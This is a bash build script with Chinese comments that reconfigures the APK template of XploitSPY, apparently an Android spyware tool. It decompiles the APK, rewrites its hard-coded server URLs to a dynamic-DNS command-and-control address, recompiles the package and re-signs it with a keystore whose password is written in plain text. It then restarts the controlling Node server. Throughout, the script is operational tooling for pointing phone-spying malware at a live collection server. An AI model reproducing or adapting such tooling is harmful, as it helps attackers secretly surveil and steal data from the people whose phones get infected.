#!/bin/bash
# 完整修复脚本 - 一步到位

set -e  # 遇到错误立即退出

PROJECT_DIR="/home/test2/XploitSPYpro-main202605100042/XploitSPYpro-main"
FACTORY_DIR="$PROJECT_DIR/server/app/factory"

echo "=========================================="
echo "XploitSPY APK 模板完整修复"
echo "=========================================="

cd "$FACTORY_DIR"

echo ""
echo "=== 步骤1: 备份原APK ==="
if [ -f "app-release.apk" ]; then
    cp app-release.apk app-release.backup.$(date +%Y%m%d%H%M%S)
    echo "✓ 已备份"
fi

echo ""
echo "=== 步骤2: 创建临时工作目录 ==="
rm -rf /tmp/fix_apk
tmpdir=$(mktemp -d)
cd "$tmpdir"

echo ""
echo "=== 步骤3: 反编译APK ==="
java -jar "$FACTORY_DIR/apktool.jar" d -f -o decompiled "$FACTORY_DIR/app-release.apk"

echo ""
echo "=== 步骤4: 查找当前URL ==="
echo "当前APK中的URL:"
find decompiled/smali -name "*.smali" -exec grep -H "http://" {} \; | head -5

echo ""
echo "=== 步骤5: 修复URL ==="
# 修复各种可能的本地地址
find decompiled/smali -name "*.smali" -exec sed -i \
    -e 's|http://localhost:80|http://ubuntu222506test.webredirect.org:8080|g' \
    -e 's|http://127\.0\.0\.1:80|http://ubuntu222506test.webredirect.org:8080|g' \
    -e 's|http://xwizer\.herokuapp\.com:80|http://ubuntu222506test.webredirect.org:8080|g' \
    {} \;

echo "✓ URL替换完成"

echo ""
echo "=== 步骤6: 验证修复 ==="
echo "修复后的URL:"
find decompiled/smali -name "*.smali" -exec grep -H "http://" {} \; | head -5

echo ""
echo "=== 步骤7: 重新编译APK ==="
java -jar "$FACTORY_DIR/apktool.jar" b decompiled -o app-release-new.apk

echo ""
echo "=== 步骤8: 签名APK ==="
cd "$FACTORY_DIR"
java -jar uber-apk-signer-1.1.0.jar \
    -a "$tmpdir/app-release-new.apk" \
    --ks release.jks --ksAlias key0 \
    --ksPass release101 --ksKeyPass release101 \
    --ksType JKS --allow-resign --overwrite \
    -o "$tmpdir"

echo ""
echo "=== 步骤9: 替换原APK ==="
# 查找签名后的文件
SIGNED=$(ls -t "$tmpdir/"*signed*.apk 2>/dev/null | head -1)
if [ -z "$SIGNED" ]; then
    SIGNED=$(ls -t "$tmpdir/"*aligned*.apk 2>/dev/null | head -1)
fi
if [ -z "$SIGNED" ]; then
    SIGNED="$tmpdir/app-release-new.apk"
fi

mv app-release.apk app-release.old
mv "$SIGNED" app-release.apk

echo ""
echo "=== 步骤10: 更新decompiled目录 ==="
rm -rf decompiled
java -jar apktool.jar d -f -o decompiled app-release.apk

echo ""
echo "=== 步骤11: 清理 ==="
rm -rf "$tmpdir" app-release.old

echo ""
echo "=========================================="
echo "修复完成! 验证结果:"
echo "=========================================="
echo ""
echo "APK模板中的URL:"
unzip -p app-release.apk classes.dex | strings | grep "http://" | head -5
echo ""
echo "Decompiled目录中的URL:"
grep -r "http://" decompiled/smali/com/remote/app/ 2>/dev/null | head -3
echo ""
echo "=========================================="
echo "请重启服务器测试:"
echo "  cd $PROJECT_DIR/server"
echo "  pkill -f 'node index.js'  # 停止旧进程"
echo "  PORT=8080 node index.js   # 启动新进程"
echo "=========================================="
